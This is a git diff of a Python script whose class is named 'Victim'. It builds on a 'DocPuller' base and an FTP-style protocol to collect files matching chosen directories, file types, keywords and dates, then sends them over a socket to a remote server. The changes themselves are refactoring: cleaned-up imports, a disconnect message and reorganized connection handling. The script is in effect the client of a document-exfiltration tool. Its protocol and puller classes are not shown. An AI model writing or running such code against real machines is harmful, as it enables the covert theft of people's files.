@@ -1,17 +1,16 @@
 __author__ = 'ben'
 
-import os
 import socket
 
-from real.DocPullerScripts.DocPullerFTP.protocol import Protocol
-from real.DocPullerScripts.DocPullerGenric import DocPuller
+from DocPullerScripts.DocPullerFTP.protocol import Protocol
+from DocPullerScripts.DocPullerGenric import DocPuller
 
 
 class Victim(DocPuller, Protocol):
 
     def __init__(self, server, port, directorys, file_types, key_words, date):
-        DocPuller.__init__(self,directorys, file_types, key_words, date)
-        Protocol.__init__(self,server, port)
+        DocPuller.__init__(self, directorys, file_types, key_words, date)
+        Protocol.__init__(self, server, port)
         self.victim = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     def _pull_files(self):
@@ -24,18 +23,15 @@ class Victim(DocPuller, Protocol):
                 print('sending', file_name)
                 file_name = file_name.encode()
                 self.send_file(self.victim, file_name, file_data)
-
+        self._send_string(self.DISCONNECT_MSG.encode())
     def main(self):
         try:
             self.victim.connect(self.ADDR)
+            self._main()
+            self.victim.close()
+            print('done.')
         except Exception as e:
             print(e)
-
-        connected = True
-        if connected:
-            self._main()
-        self.victim.close()
-        print('done.')
 
 
 if __name__ == '__main__':
